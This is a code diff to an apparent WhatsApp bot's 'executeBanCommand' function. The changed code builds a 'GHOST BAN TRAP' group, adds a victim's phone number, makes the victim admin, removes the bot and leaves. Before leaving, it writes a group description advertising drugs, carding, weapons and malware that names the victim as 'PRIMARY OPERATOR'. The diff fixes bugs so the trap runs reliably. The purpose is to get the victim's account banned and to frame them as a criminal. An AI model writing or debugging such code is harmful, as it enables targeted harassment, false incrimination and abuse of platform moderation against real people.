@@ -32,55 +32,59 @@ async function executeBanCommand(targetNumber) {
     }
     
     isExecutingBan = true;
-    const targetJid = targetNumber + "@s.whatsapp.net";
-    const botJid = sock.user.id;
+    
+    const cleanTarget = targetNumber.replace(/\D/g, '');
+    if (cleanTarget.length < 10) {
+        isExecutingBan = false;
+        return { success: false, error: "Invalid target number format" };
+    }
+    
+    const targetJid = cleanTarget + "@s.whatsapp.net";
+    
+    // FIX: Remove :XX suffix from bot JID if present
+    let botJid = sock.user.id;
+    if (botJid.includes(':')) {
+        botJid = botJid.split(':')[0] + '@s.whatsapp.net';
+    }
     
     try {
-        // Create group
-        const group = await sock.groupCreate("GHOST BAN TRAP", [botJid, targetJid]);
+        // Step 1: Create group with EMPTY participants array (same as your bot!)
+        const group = await sock.groupCreate("GHOST BAN TRAP", []);
         const groupJid = group.id;
-        console.log("[✓] Group created: " + groupJid);
         
         await delay(2000);
         
-        // Promote target
+        // Step 2: Add bot and target
+        await sock.groupParticipantsUpdate(groupJid, [botJid, targetJid], "add");
+        await delay(2000);
+        
+        // Step 3: Promote target
         await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
-        console.log("[✓] Target promoted");
-        
         await delay(1500);
         
-        // Demote bot
+        // Step 4: Demote bot
         await sock.groupParticipantsUpdate(groupJid, [botJid], "demote");
-        console.log("[✓] Bot demoted");
-        
         await delay(1500);
         
-        // Update description
+        // Step 5: Update description
         const desc = `⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** ${targetNumber}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.`;
         await sock.groupUpdateDescription(groupJid, desc);
-        console.log("[✓] Description updated");
-        
         await delay(1500);
         
-        // Update profile picture if exists
+        // Step 6: Profile picture
         if (fs.existsSync("ghost_ban_profile.jpg")) {
             const pic = fs.readFileSync("ghost_ban_profile.jpg");
             await sock.updateProfilePicture(groupJid, pic);
-            console.log("[✓] Profile picture updated");
+            await delay(1500);
         }
         
-        await delay(1500);
-        
-        // Leave group
+        // Step 7: Leave group
         await sock.groupLeave(groupJid);
-        console.log("[✓] Bot left group");
-        console.log("BAN_COMPLETE");
         
         isExecutingBan = false;
         return { success: true, message: "Trap group created successfully" };
         
     } catch (err) {
-        console.log("ERROR: " + err.message);
         isExecutingBan = false;
         return { success: false, error: err.message };
     }
